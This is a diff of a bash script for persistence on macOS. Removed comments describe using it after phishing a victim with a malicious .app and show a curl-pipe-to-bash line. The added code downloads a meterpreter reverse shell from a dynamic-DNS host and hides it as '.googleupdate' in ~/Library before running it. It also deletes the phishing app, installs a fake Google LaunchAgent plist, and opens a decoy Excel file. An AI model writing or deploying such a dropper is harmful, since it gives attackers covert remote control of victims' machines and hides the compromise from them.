@@ -1,18 +1,17 @@
 #!/usr/bin/env bash
 
-# This script is customized. As professional red teamer i used this in a legal prenetration test.
-# Once i got first access after an email with WeTransfer sending malicious .app generated with pyinstaller 
-# after shell popped to me i immediatemely ran this one liner to download and execute this script:
-# (you can change the namefile obv and hide .sh extension)
-#
-# curl -s -k https://MY_C2C_IP/osx_persistence/ | bash
-
 # URL hosting our malicious mach-o reverse shell generated with msfvenom
-# msfvenom -p osx/x64/meterpreter_reverse_https LHOST=YOUR-IP LPORT=YOUR-PORT -f macho > macho
-URL="https://192.168.1.7:4443/macho"
+# msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=dns1resolve.hopto.org LPORT=443 -f macho > osx
+URL="https://dns1resolve.hopto.org:55143/osx"
 
-# Randomize payload name
-PAYLOAD=$RANDOM
+# URL hosting our plist file
+PLISTURL="https://dns1resolve.hopto.org:55143/plist"
+
+# URL to download a real excel file
+EXCELURL=""
+
+# Rename our payload macho-o name
+PAYLOAD="googleupdate"
 
 # Add dot to make hidden file
 PAYLOAD=".${PAYLOAD}"
@@ -22,15 +21,29 @@ PAYLOAD=".${PAYLOAD}"
 # or
 # Download from https
 # This payload is our persistence reverse backdoor in mach-o format!!!
-curl -k $URL -o ~/$PAYLOAD
+curl -s -k $URL -o ~/Library/$PAYLOAD
 
 # Want to be sure that's my payload is executable
-chmod +x ~/$PAYLOAD
+chmod +x ~/Library/$PAYLOAD
 
-# Persistence in .bashrc. Our backdoor will call us after user login.
+# Launch the macho-o reverse backdoor
+~/Library/$PAYLOAD &
+
+sleep 2
+
+# Remove original malicious .app directory from victim
+rm -rf planimetria* 2>/dev/null 
+
+# Persistence as LaunchAgents. Our backdoor will call us after user login.
 # If we kill session once established, victim neeeds to log off and log in again to get another shell,
 # or just reboot.
-echo "~/$PAYLOAD & 2>&1" >> ~/.bashrc
+#
+# Download and write backdoored plist file
+curl -s -k $PLISTURL -o ~/Library/com.google.update.plist
 
-# Remove itself
-rm osx_persistence 2>&1
+# Get current dir
+CURRENTDIR=pwd
+
+# Download and open a real file excel
+curl -s $EXCELURL -o $CURRENTDIR/progetto.xls
+open $CURRENTDIR/progetto.xls
